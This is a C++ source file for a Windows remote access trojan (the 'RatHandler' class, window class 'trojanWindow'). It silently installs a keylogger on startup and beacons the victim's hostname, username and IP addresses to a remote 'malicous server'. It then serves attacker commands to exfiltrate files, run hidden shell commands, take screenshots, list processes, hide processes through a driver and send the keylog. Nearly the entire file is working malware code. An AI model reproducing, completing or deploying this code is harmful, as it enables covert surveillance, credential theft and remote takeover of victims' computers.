#include "stdafx.h"
#include "RatHandler.h"

#define BUFLEN 20004
using namespace std;

HHOOK hook;
HANDLE hMutex;
char keyBuffer[KEY_BUFLEN];
char tempc[MAXLEN + 5];
char sendBuf[SEND_BUFLEN], recvBuf[RECV_BUFLEN], *pszAddr = NULL;

/*
char hostName[INFO_BUFLEN] = { 0 },
userName[INFO_BUFLEN] = { 0 },
ip[INFO_BUFLEN] = { 0 };
*/


struct profileInfo {
	SOCKET clientManager;
	char* buf;
	sockaddr_in* serAddr;
};

int sockLen = sizeof(SOCKADDR);
SOCKADDR_IN addrServer, addrClient;
const char g_szClassName[] = "trojanWindow";
const char keyboard_save_file[] = "key.log";
const char screenshot_save_file[] = "screen.bmp";
const wchar_t uscreenshot_save_file[] = { L"screen.bmp" };
fd_set rfd;
u_long ul = 1;
struct timeval timeout;

RatHandler::RatHandler(char* remote_server_ip, int length, unsigned int remote_server_port) {
	this->remote_server_ip = (char*)calloc(length, sizeof(char));
	memcpy(this->remote_server_ip, remote_server_ip, sizeof(char) * length);
	this->remote_server_ip_length = length;
	this->remote_server_port = remote_server_port;

	HINSTANCE hInstance;
	hInstance = GetModuleHandle(0);
	DWORD Tid;
	HANDLE keyloggerThread = CreateThread(0, 0, ThreadProc, hInstance, 0, &Tid);

}

RatHandler::~RatHandler() {
}

bool RatHandler::runRatServer(unsigned int local_server_port) {
	// retrieves LAPTOP#####, must be 256 bytes or less
	char* hostName = (char*)calloc(256, sizeof(char));
	gethostname(hostName, 256);
	// retrieves host information corresponding to a host name
	struct hostent* phostinfo = gethostbyname(hostName);

	// retrieves NULL-terminated list of addresses for the host into ip
	char* ip_info_buffer = (char*)calloc(256, sizeof(char));
	for (int i = 0; phostinfo != NULL && phostinfo->h_addr_list[i] != NULL; i++) {
		pszAddr = inet_ntoa(*(struct in_addr *)phostinfo->h_addr_list[i]);
	}
	free(hostName);
	// creates a socket, choose IPv4 TCP with no specified protocol
	ratServer = socket(AF_INET, SOCK_STREAM, 0);

	// converts a string containing an IPv4 dotted-decimal into unsigned long
	addrServer.sin_addr.S_un.S_addr = inet_addr(pszAddr);
	// IPv4
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(local_server_port);

	// associates a local address with a socket
	if (bind(ratServer, (SOCKADDR *)&addrServer, sizeof(SOCKADDR)) == SOCKET_ERROR) {
		printf("Error while binding ratServer with local address IPv4 %s at port %d, error:%d\n", pszAddr, local_server_port, WSAGetLastError());
		closesocket(ratServer);
		return 0;
	}

	// listening for an incoming connection, maximum length of the queue of pending connections is 1
	listen(ratServer, 1);
	printf("RatServer listening at IPv4 address %s at port %d...\n", pszAddr, local_server_port);
}

// after listening started, notify attacker of a new compromised machine with info about it
bool RatHandler::runRatClient() {
	// retrieves LAPTOP#####, must be 256 bytes or less
	char* hostName = (char*)calloc(256, sizeof(char));
	gethostname(hostName, 256);
	// retrieves User Name, must be UNLEN + 1 byets 
	char* userName = (char*)calloc(UNLEN + 1, sizeof(char));
	wchar_t* wcuserName = (wchar_t*)calloc(UNLEN + 1, sizeof(wchar_t));
	DWORD bufCharCount;
	GetUserName((LPWSTR)wcuserName, &bufCharCount);
	userName = GetChar_Convert(wcuserName);
	// retrieves host information corresponding to a host name
	struct hostent* phostinfo = gethostbyname(hostName);

	// retrieves NULL-terminated list of addresses for the host into ip
	char* ip_info_buffer = (char*)calloc(256, sizeof(char));
	for (int i = 0; phostinfo != NULL && phostinfo->h_addr_list[i] != NULL; i++) {
		pszAddr = inet_ntoa(*(struct in_addr *)phostinfo->h_addr_list[i]);
		strcat_s(ip_info_buffer, INFO_BUFLEN, pszAddr);
		strcat_s(ip_info_buffer, INFO_BUFLEN, ",");
	}

	// send this to malicous server
	char* info_buffer = (char*)calloc(1024, sizeof(char));
	sprintf_s(info_buffer, 1024, "%s,%s,%s", hostName, userName, ip_info_buffer);

	sockaddr_in* serAddr = (sockaddr_in*)calloc(1, sizeof(sockaddr_in));
	serAddr->sin_family = AF_INET;
	serAddr->sin_port = htons(this->remote_server_port);
	serAddr->sin_addr.S_un.S_addr = inet_addr(this->remote_server_ip);

	/*
	clientManager = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(clientManager, (sockaddr*)serAddr, sizeof(sockaddr)) == SOCKET_ERROR) {
	std:cout << "BROKEN !\n";
	}
	getchar();
	*/
	profileInfo* myInfo = (profileInfo*)calloc(1, sizeof(profileInfo));
	DWORD updateRemoteServerID;
	myInfo->buf = info_buffer;
	myInfo->clientManager = clientManager;
	myInfo->serAddr = serAddr;
	HANDLE updateRemoteServerThread = 0;
	std::cout << myInfo->buf << std::endl;
	updateRemoteServerThread = CreateThread(0, 0, updateRemoteServer, myInfo, 0, &updateRemoteServerID);

	/*
	free(ip_info_buffer);
	free(userName);
	free(hostName);
	*/
	return true;
}

bool RatHandler::getScreenShot(const wchar_t *path) {
	HANDLE hDIB, file;
	DWORD dwBmpSize, dwSizeofDIB, dwBytesWritten;
	HBITMAP hbmScreen = NULL;
	BITMAP bmpScreen;
	BITMAPFILEHEADER bmfHeader;
	BITMAPINFOHEADER bi;
	char *lpbitmap;
	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);
	HDC hdcScreen = GetDC(NULL); // DC for whole screen
	HDC hdcMemDC = CreateCompatibleDC(hdcScreen);

	if (!hdcMemDC) {
		DeleteObject(hbmScreen);
		DeleteObject(hdcMemDC);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);

	if (!hbmScreen) {
		DeleteObject(hbmScreen);
		DeleteObject(hdcMemDC);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	SelectObject(hdcMemDC, hbmScreen);
	if (!BitBlt(
		hdcMemDC,			// target DC
		0, 0,				// coordinates of target DC
		width, height,		// width, height of DC
		hdcScreen,			// source DC
		0, 0,				// coordinates of source DC
		SRCCOPY)) {			// copy method
		DeleteObject(hbmScreen);
		DeleteObject(hdcMemDC);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmpScreen.bmWidth;
	bi.biHeight = bmpScreen.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

	hDIB = GlobalAlloc(GHND, dwBmpSize);
	lpbitmap = (char *)GlobalLock(hDIB);

	GetDIBits(
		hdcScreen,					// device handle
		hbmScreen,					// bmp handle
		0,							// first scan line of index
		(UINT)bmpScreen.bmHeight,	// lines of index
		lpbitmap,					// pointer to buf of index
		(BITMAPINFO *)&bi,			// data structual
		DIB_RGB_COLORS				// RGB
	);

	file = CreateFile(
		(LPCWSTR)path,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (file == INVALID_HANDLE_VALUE) {
		return false;
	}

	dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
	bmfHeader.bfSize = dwSizeofDIB;
	bmfHeader.bfType = 0x4D42;
	dwBytesWritten = 0;
	WriteFile(file, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	WriteFile(file, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	WriteFile(file, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

	GlobalUnlock(hDIB);
	GlobalFree(hDIB);
	CloseHandle(file);

	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

	//hideFile(path);
	return true;
}

bool RatHandler::hideFile(const wchar_t *path) {
	if (SetFileAttributes((LPCWSTR)path, FILE_ATTRIBUTE_HIDDEN) != 0)
		return true;
	return false;
}

bool RatHandler::sendFile(const char *path) {
	FILE *fp;
	int error = fopen_s(&fp, path, "rb");
	printf("%s\n", path);
	if (error != 0) {
		send_s(this->ratClient, "OPENFAIL", 9);
		return false;
	}
	else {
		fseek(fp, 0, SEEK_END);
		long length = ftell(fp);
		fseek(fp, 0, SEEK_SET);
		char filelength[21] = "OPENSUCC";
		memcpy(filelength + 8, (void*)&length, 8);
		send_s(this->ratClient, filelength, 17);
	}
	char send_buf[SEND_BUFLEN];
	unsigned int readLen = 0;
	do {
		if (SOCKET_ERROR == recv_s(this->ratClient, NULL, 0)) {
			fclose(fp);
			return false;
		}
		readLen = readFileIntoBuf(&fp, send_buf, SEND_BUFLEN);
		if (SOCKET_ERROR == send_s(this->ratClient, send_buf, readLen)) {
			fclose(fp);
			return false;
		}
	} while (readLen != SOCKET_ERROR && readLen != 0);
	fclose(fp);
	return true;
}

bool RatHandler::getFile(const char *path) {
	char recOper[BUFLEN];
	memset(recOper, 0, BUFLEN);
	FILE *fp;
	int error = fopen_s(&fp, path, "wb");
	printf("%s\n", path);
	if (error != 0) {
		send_s(this->ratClient, "OPENFAIL", 9);
		return false;
	}
	send_s(this->ratClient, "GOOD", 4);
	int recvFlag = recv_s(this->ratClient, recOper, BUFLEN);
	if (recvFlag == SOCKET_ERROR || recvFlag == 0)
		return false;
	long filelength = *(long *)(recOper);
	// receive binary file
	while (true) {
		memset(recOper, 0, BUFLEN);
		if (SOCKET_ERROR == send_s(this->ratClient, NULL, 0))
			return false;

		Sleep(5);
		int recvFlag = recv_s(this->ratClient, recOper, BUFLEN);
		Sleep(5);
		if (recvFlag == SOCKET_ERROR) {
			fclose(fp);
			return false;
		}
		else if (recvFlag == 0) {
			if (filelength == 0) {
				fflush(fp);
				fclose(fp);
				return true;
			}
			return false;
		}
		fwrite(recOper, 1, recvFlag, fp);
		fflush(fp);
		filelength -= recvFlag;
	}
	fclose(fp);
	return true;

}

bool RatHandler::hideProcess(const char *pid) {
	if (this->hDriver == nullptr || this->hDriverHandler == nullptr) return false;
	else {
		char pidC[BUFLEN];
		memset(pidC, 0, BUFLEN);
		memcpy(pidC, pid, BUFLEN);
		std::cout << "hiding: " << pidC << std::endl;
		hDriverHandler->handle_hideprocess(*hDriver, pidC);
		return true;
	}
}

bool RatHandler::popMsgBox(const char *msg) {
	wchar_t* w_msg = GetWC(msg);
	MessageBox(0, w_msg, L"???????????", MB_OK);
	return true;
}

bool RatHandler::sendSystemInfo() {
	OSVERSIONINFOEX os;

	char temp[INFO_BUFLEN] = "\0", info[INFO_BUFLEN] = "\0";
	DWORD namesize;
	os.dwOSVersionInfoSize = sizeof(os);

	if (true) {//!GetVersionEx((LPOSVERSIONINFOW)&os)){
		strcpy_s(temp, INFO_BUFLEN, "Unknown");
	}
	else {
		if (os.dwMajorVersion == 6) {
			if (os.dwMinorVersion == 2)
				strcpy_s(temp, INFO_BUFLEN, "Windows 8");
			else if (os.dwMinorVersion == 1) {
				if (os.wProductType == VER_NT_WORKSTATION)
					strcpy_s(temp, INFO_BUFLEN, "Windows 7");
				else
					strcpy_s(temp, INFO_BUFLEN, "Microsoft Windows Server 2008 R2");
			}
			else if (os.dwMinorVersion == 0) {
				if (os.wProductType == VER_NT_WORKSTATION)
					strcpy_s(temp, INFO_BUFLEN, "Microsoft Windows Vista");
				else
					strcpy_s(temp, INFO_BUFLEN, "Microsoft Windows Server 2008");
			}
		}
		else if (os.dwMajorVersion == 5) {
			if (os.dwMinorVersion == 2)
				strcpy_s(temp, INFO_BUFLEN, "Windows Server 2003");
			else if (os.dwMinorVersion == 1)
				strcpy_s(temp, INFO_BUFLEN, "Windows XP");
			else if (os.dwMinorVersion == 0)
				strcpy_s(temp, INFO_BUFLEN, "Windows 2000");
		}
	}
	if (strcmp(temp, "Unknown")) {
		sprintf_s(info, INFO_BUFLEN, "version: %s", temp);
	}
	memset(temp, 0, INFO_BUFLEN);

	if (GetComputerName((LPWSTR)temp, &namesize)) {
		sprintf_s(info, INFO_BUFLEN, "%s PC:%ws", info, temp);
	}
	memset(temp, 0, INFO_BUFLEN);

	if (GetUserName((LPWSTR)temp, &namesize)) {
		sprintf_s(info, INFO_BUFLEN, "%s User:%ws", info, temp);
	}

	if (send_s(this->ratClient, info, strlen(info) + 1) != SOCKET_ERROR)
		return true;
	return false;
}

bool RatHandler::getCurrentProcesses(char *buf, const unsigned int buflen) {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE shot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (shot == INVALID_HANDLE_VALUE) {
		return false;
	}
	if (!Process32First(shot, &pe32)) {
		CloseHandle(shot);
		return false;
	}
	memset(buf, 0, buflen);
	char temp[101];
	while (Process32Next(shot, &pe32)) {
		memset(temp, 0, 101);
		sprintf_s(temp,
			101,
			"%ws\t %u\t %d\t %d\t %u\n",
			pe32.szExeFile,
			pe32.th32ParentProcessID,
			pe32.cntThreads,
			pe32.pcPriClassBase,
			pe32.th32ProcessID
		);
		strcat_s(buf, buflen, temp);
	}
	CloseHandle(shot);
	return true;
}

bool RatHandler::runCommand(char *cmdStr) {
	DWORD readByte = 0;
	char command[CMD_BUFLEN] = "\0", cmd_buf[CMD_BUFLEN] = "\0";
	int bsize = 0;
	bool first = true;

	HANDLE hRead, hWrite;
	STARTUPINFO si;         // config startup info
	PROCESS_INFORMATION pi; // process info
	SECURITY_ATTRIBUTES sa; // tunnel security

	sprintf_s(command, CMD_BUFLEN, "cmd.exe /c %s", cmdStr);
	printf("%s\n", command);
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hRead, &hWrite, &sa, CMD_BUFLEN)) {
		return false;
	}

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;					// hide window
	si.hStdOutput = si.hStdError = hWrite;		// set output stream to pipe

	TCHAR wcommand[CMD_BUFLEN * 2];
	MultiByteToWideChar(0, 0, command, CMD_BUFLEN, wcommand, CMD_BUFLEN * 2);

	if (!CreateProcess(NULL,
		wcommand,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&si,
		&pi)) {
		//printf("failed CreateProcess1!\n");
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return false;
	}
	//printf("failed CreateProcess2!\n");
	CloseHandle(hWrite);
	//printf("failed CreateProcess3!\n");

	if (SOCKET_ERROR == send_s(this->ratClient, NULL, 0)) {
		//printf("failed CreateProcess4!\n");
		return false;
	}
	//printf("failed CreateProcess5!\n");
	//printf("%s \t\t %d \t\t %s!\n", cmd_buf,);
	while (ReadFile(hRead, cmd_buf + bsize, CMD_BUFLEN - bsize, &readByte, NULL)) {
		printf("%s\n", cmd_buf);
		//printf("failed CreateProcess6!\n");
		if (!readByte) {
			if (first)
				first = false;
			break;
		}
		bsize = strlen(cmd_buf);
		if (bsize == CMD_BUFLEN) {
			if (SOCKET_ERROR == recv_s(this->ratClient, NULL, 0))
				return false;
			if (SOCKET_ERROR == send_s(this->ratClient, cmd_buf, bsize + 1))
				return false;
			memset(cmd_buf, 0, bsize);
			bsize = 0;
		}
	}
	//printf("failed CreateProcess7!\n");
	if (bsize > 0) {
		//printf("failed CreateProcess8!\n");
		if (SOCKET_ERROR == recv_s(this->ratClient, NULL, 0))
			return false;
		//printf("failed CreateProcess9!\n");
		if (SOCKET_ERROR == send_s(this->ratClient, cmd_buf, bsize + 1))
			return false;
		memset(cmd_buf, 0, bsize);
		bsize = 0;
	}
	//printf("failed CreateProcess9!\n");
	if (SOCKET_ERROR == recv_s(this->ratClient, NULL, 0))
		return false;
	//printf("failed CreateProcess10!\n");
	if (SOCKET_ERROR == send_s(this->ratClient, NULL, 0))
		return false;
	CloseHandle(hRead);
	return true;
}

bool RatHandler::dealWithCommand(char *sendBuf, char *recvBuf, int recvLen) {
	WaitForSingleObject(hMutex, INFINITE);

	memset(sendBuf, 0, SEND_BUFLEN);
	if (!strncmp(recvBuf, "GETFILE", 7)) {
		strncpy_s(sendBuf, SEND_BUFLEN, recvBuf + 7, recvLen - 7);
		return sendFile(sendBuf);
	}
	else if (!strncmp(recvBuf, "SENDFILE", 8)) {
		strncpy_s(sendBuf, SEND_BUFLEN, recvBuf + 8, recvLen - 8);
		return getFile(sendBuf);
	}
	else if (!strncmp(recvBuf, "HIDEPROC", 8)) {
		strncpy_s(sendBuf, SEND_BUFLEN, recvBuf + 8, recvLen - 8);
		return hideProcess(sendBuf);
	}
	else if (!strncmp(recvBuf, "MSGBOX", 6)) {
		strncpy_s(sendBuf, SEND_BUFLEN, recvBuf + 6, recvLen - 6);
		return popMsgBox(sendBuf);
	}
	else if (!strncmp(recvBuf, "RUNCMD", 6)) {
		strncpy_s(sendBuf, SEND_BUFLEN, recvBuf + 6, recvLen - 6);
		printf("%s\n", recvBuf);
		printf("%s\n", sendBuf);
		return runCommand(sendBuf);
	}
	else if (!strncmp(recvBuf, "PCINFO", 6)) {
		return sendSystemInfo();
	}
	else if (!strncmp(recvBuf, "KEYBOARD", 8)) {
		return sendFile(keyboard_save_file);
		/*
		FILE *fp;
		int error = fopen_s(&fp, keyboard_save_file, "r");
		if (error != 0) {
		send_s(this->ratClient, "KEYBOARD FAILED", strlen("KEYBOARD FAILED") + 1);
		return false;
		}
		fprintf(fp, "%s", keyBuffer);
		fflush(fp);
		fclose(fp);
		memset(keyBuffer, 0, KEY_BUFLEN);
		sprintf_s(sendBuf, SEND_BUFLEN, "type %s", keyboard_save_file);
		send_s(this->ratClient, "KEYBOARD SUCCEED", strlen("KEYBOARD SUCCEED") + 1);
		return true;
		*/
	}
	else if (!strncmp(recvBuf, "PSLIST", 6)) {
		if (getCurrentProcesses(sendBuf, SEND_BUFLEN)) {
			return send_s(this->ratClient, sendBuf, strlen(sendBuf) + 1) > 0 ? true : false;
		}
		else {
			return false;
		}
	}
	else if (!strncmp(recvBuf, "SCREENSHOT", 10)) {
		if (getScreenShot(uscreenshot_save_file)) {
			send_s(this->ratClient, "SCREENSHOT SUCCEED", strlen("SCREENSHOT SUCCEED") + 1);
			return true;
		}
		else {
			send_s(this->ratClient, "SCREENSHOT FAILED", strlen("SCREENSHOT FAILED") + 1);
			return false;
		}
	}
	else {
		send_s(this->ratClient, "UNKNOWN COMMAND", strlen("UNKNOWN COMMAND") + 1);
		return false;
	}
	ReleaseMutex(hMutex);
}

unsigned int RatHandler::readFileIntoBuf(FILE **fp, char *buf, unsigned int buflen) {
	size_t readLen = 0, index = 0;
	while ((readLen = fread(buf + index, sizeof(char), buflen - 4 - index, *fp)) != 0) {
		index += readLen;
		if (index == buflen - 4) {
			break;
		}
	}
	return index;
}

int RatHandler::send_s(SOCKET& socket_handle, const char *buf, int sendlen) {
	/* content check */
	memcpy(tempc, "FLAG", 4);
	if (buf) {
		memcpy(tempc + 4, buf, sendlen);
	}
	int realSendLen = send(socket_handle, tempc, sendlen + 4, 0);
	if (realSendLen == SOCKET_ERROR)
		return SOCKET_ERROR;
	return realSendLen - 4 >= 0 ? realSendLen : 0;
}

int RatHandler::recv_s(SOCKET& socket_handle, char *buf, unsigned int buflen) {
	memset(buf, 0, buflen);
	int recvLen = recv(socket_handle, tempc, buflen + 4, 0);
	if (recvLen == SOCKET_ERROR)
		return SOCKET_ERROR;
	if (recvLen < 4 || strncmp(tempc, "FLAG", 4) != 0) {
		return 0;
	}
	else {
		memcpy(buf, tempc + 4, recvLen - 4);
		return recvLen - 4;
	}
}

void RatHandler::acceptConnection() {
	while (true) {
		while (true) {
			Sleep(1000);
			this->ratClient = accept(this->ratServer, (SOCKADDR *)&addrClient, &sockLen);
			printf("OK!\n");
			if (this->ratClient != SOCKET_ERROR) {
				printf("YES!\n");
				send_s(this->ratClient, "200-success", strlen("200-success") + 1);
				break;
			}
		}
		//int timeout = 30000; //in milliseconds. this is 30 seconds

		//setsockopt(sclient, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(int)); //setting the receive timeout


		printf("remote client connected..\n");
		FD_SET(this->ratClient, &rfd);

		while (true) {
			if (FD_ISSET(this->ratClient, &rfd)) {
				memset(recvBuf, 0, sizeof(recvBuf));
				int recvLen = recv_s(this->ratClient, recvBuf, RECV_BUFLEN);
				if (recvLen == SOCKET_ERROR)
					break;
				dealWithCommand(sendBuf, recvBuf, recvLen);
			}
		}

		printf("remote client disconnected..\n");
	}
	return;

}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	int press = p->vkCode;
	std::cout << "KeyboardProc!" << strlen(keyBuffer) << std::endl;
	if (strlen(keyBuffer) >= KEY_BUFLEN - 13) {
		FILE *fp;
		int error = fopen_s(&fp, keyboard_save_file, "a");
		if (error != 0) {
			return CallNextHookEx(hook, nCode, wParam, lParam);
		}
		fprintf(fp, "%s", keyBuffer);
		fflush(fp);
		fclose(fp);
		memset(keyBuffer, 0, KEY_BUFLEN);
	}

	/*
	DWORD dwMsg = 1;
	dwMsg += p->scanCode << 16;
	dwMsg += p->flags << 24;
	wchar_t lpszKeyName[1024] = { 0 };
	lpszKeyName[0] = '[';
	int i = GetKeyNameText(dwMsg, (lpszKeyName + 1), 0xFF) + 1;
	lpszKeyName[i] = ']';

	char* valueAction = GetChar_Convert(lpszKeyName);
	strcat_s(keyBuffer, KEY_BUFLEN, valueAction);
	*/

	if (nCode >= 0 && wParam == WM_KEYDOWN) {
		// F1 - F12 
		if (press >= 112 && press <= 135) {
			sprintf_s(keyBuffer + strlen(keyBuffer), KEY_BUFLEN, "F%d ", press - 111);
		}
		// Num 0 - 9 
		else if (press >= 48 && press <= 57) {
			sprintf_s(keyBuffer + strlen(keyBuffer), KEY_BUFLEN, "%c ", press);
		}
		// letters 
		else if (press >= 65 && press <= 90) {
			if (GetAsyncKeyState(VK_SHIFT) >= 0) press += 32;
			if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
				if (press <= 90) press += 32;
				else press -= 32;
			}
			sprintf_s(keyBuffer + strlen(keyBuffer), KEY_BUFLEN, "%c ", press);
		}
		// M0 - M9 
		else if ((press >= 96 && press <= 105)) {
			sprintf_s(keyBuffer + strlen(keyBuffer), KEY_BUFLEN, "%c ", press - 48);
		}
		else switch (press) {
		case  8:strcat_s(keyBuffer, KEY_BUFLEN, "[Backspace] ");	break;
		case  9:strcat_s(keyBuffer, KEY_BUFLEN, "[Tab] ");			break;
		case 13:strcat_s(keyBuffer, KEY_BUFLEN, "[Enter] ");		break;
		case 18:strcat_s(keyBuffer, KEY_BUFLEN, "[Alt] ");			break;
		case 19:strcat_s(keyBuffer, KEY_BUFLEN, "[Pause] ");		break;
		case 20:strcat_s(keyBuffer, KEY_BUFLEN, "[CapsLk] ");		break;
		case 27:strcat_s(keyBuffer, KEY_BUFLEN, "[Esc] ");			break;
		case 32:strcat_s(keyBuffer, KEY_BUFLEN, "[Space] ");		break;
		case 33:strcat_s(keyBuffer, KEY_BUFLEN, "[PgUp] ");			break;
		case 34:strcat_s(keyBuffer, KEY_BUFLEN, "[PgDn] ");			break;
		case 35:strcat_s(keyBuffer, KEY_BUFLEN, "[End] ");			break;
		case 36:strcat_s(keyBuffer, KEY_BUFLEN, "[Home] ");			break;
		case 37:strcat_s(keyBuffer, KEY_BUFLEN, "[Left] ");			break;
		case 38:strcat_s(keyBuffer, KEY_BUFLEN, "[Up] ");			break;
		case 39:strcat_s(keyBuffer, KEY_BUFLEN, "[Right] ");		break;
		case 40:strcat_s(keyBuffer, KEY_BUFLEN, "[Down] ");			break;
		case 44:strcat_s(keyBuffer, KEY_BUFLEN, "[PrtSc] ");		break;
		case 45:strcat_s(keyBuffer, KEY_BUFLEN, "[Ins] ");			break;
		case 46:strcat_s(keyBuffer, KEY_BUFLEN, "[Del] ");			break;
		case  91:
		case  92:strcat_s(keyBuffer, KEY_BUFLEN, "[Windows] ");		break;
		case  16:
		case 160:
		case 161:strcat_s(keyBuffer, KEY_BUFLEN, "[Shift] ");		break;
		case  17:
		case 162:
		case 163:strcat_s(keyBuffer, KEY_BUFLEN, "[Ctrl] ");		break;
		case 106:strcat_s(keyBuffer, KEY_BUFLEN, "* ");			break;
		case 107:strcat_s(keyBuffer, KEY_BUFLEN, "+ ");			break;
		case 109:strcat_s(keyBuffer, KEY_BUFLEN, "- ");			break;
		case 110:strcat_s(keyBuffer, KEY_BUFLEN, ". ");			break;
		case 111:strcat_s(keyBuffer, KEY_BUFLEN, "/ ");			break;
		case 186:strcat_s(keyBuffer, KEY_BUFLEN, "; ");			break;
		case 187:strcat_s(keyBuffer, KEY_BUFLEN, "= ");			break;
		case 188:strcat_s(keyBuffer, KEY_BUFLEN, ", ");			break;
		case 189:strcat_s(keyBuffer, KEY_BUFLEN, "- ");			break;
		case 190:strcat_s(keyBuffer, KEY_BUFLEN, ". ");			break;
		case 191:strcat_s(keyBuffer, KEY_BUFLEN, "/ ");			break;
		case 192:strcat_s(keyBuffer, KEY_BUFLEN, "` ");			break;
		case 219:strcat_s(keyBuffer, KEY_BUFLEN, "[ ");			break;
		case 220:strcat_s(keyBuffer, KEY_BUFLEN, "\\ ");			break;
		case 221:strcat_s(keyBuffer, KEY_BUFLEN, "] ");			break;
		case 222:strcat_s(keyBuffer, KEY_BUFLEN, "\' ");			break;
		case 255:strcat_s(keyBuffer, KEY_BUFLEN, "[Fn] ");			break;
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

DWORD WINAPI ThreadProc(LPVOID lpThreadParameter) {
	HINSTANCE hInstance;
	hInstance = (HINSTANCE)lpThreadParameter;
	MSG Msg;
	hook = SetWindowsHookEx(
		WH_KEYBOARD_LL,			// listen : keyboard
		KeyboardProc,		// function
		hInstance,				// handle
		0						// NULL : listen all input
	);
	if (!hook) {
		return -1;
	}
	while (GetMessage(&Msg, NULL, 0, 0) > 0) {
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}

	return 0;
}

bool RatHandler::InitWSA() {
	WSADATA wsaData;
	WORD wVersionRequested;

	/*
	FD_ZERO(&rfd);
	timeout.tv_sec = 3000;				// wait 3s
	timeout.tv_usec = 0;
	*/

	wVersionRequested = MAKEWORD(2, 2); // config windows socket

	while (true) {						// loop until socket configured
		int err = WSAStartup(wVersionRequested, &wsaData);
		if (err != 0) {
			continue;
		}
		else if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
			WSACleanup();
		}
		else
			break;
	}
	return true;
}


DWORD WINAPI updateRemoteServer(LPVOID lpParameter) {
	profileInfo* structInfo = (profileInfo*)lpParameter;
	while (1) {
		structInfo->clientManager = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (connect(structInfo->clientManager, (sockaddr*)structInfo->serAddr, sizeof(sockaddr)) == SOCKET_ERROR) {
			continue;
		}
		while (1) {
			Sleep(5000);
			std::cout << structInfo->buf << std::endl;
			int res = RatHandler::send_s(structInfo->clientManager, structInfo->buf, 1024);
			if (res == SOCKET_ERROR)
				break;
		}
	}
}